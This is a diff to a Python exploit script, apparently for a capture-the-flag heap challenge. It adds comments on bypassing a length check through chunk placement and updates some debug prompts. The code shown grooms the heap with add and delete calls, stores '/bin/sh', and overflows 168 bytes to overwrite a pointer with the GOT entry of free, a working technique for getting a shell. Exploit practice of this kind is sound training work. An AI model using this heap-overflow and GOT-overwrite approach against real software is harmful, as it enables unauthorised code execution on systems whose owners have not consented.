@@ -59,7 +59,11 @@ def delete(idx):
     r.recvuntil('Action: ')
 
 #
+# In order to bypass the security check below,
+# we have to place 'p2' sufficiently farther after 'p'
+#
 # if ( p + len_text >= p2 - 4 ) error();
+#
 # fgets(*(char **)g_player_tbl[idx], len_text + 1)
 #
 def update(idx, len_desc, desc):
@@ -96,11 +100,13 @@ if __name__ == "__main__":
     add(24, 'AAAA', 8, '/bin/sh\x00')
     add(24, 'CCCC', 4, 'DDDD')
     add(24, 'EEEE', 4, 'FFFF')
-    raw_input('after adding 3 items...')
+    raw_input('after adding items...')
     #delete(0)
     delete(1)
     #delete(2)
-    raw_input('after deleting 3 items...')
+    raw_input('after deleting the in-between item...')
+
+    # chunk 'G' will be placed between chunk 'C-1' and chunk 'C-2'
     add(128, 'GGGG', 4, 'HHHH')
     raw_input('after adding 1 item...')
     update(3, 168+4, 'X'*168+p32(b.got['free']))
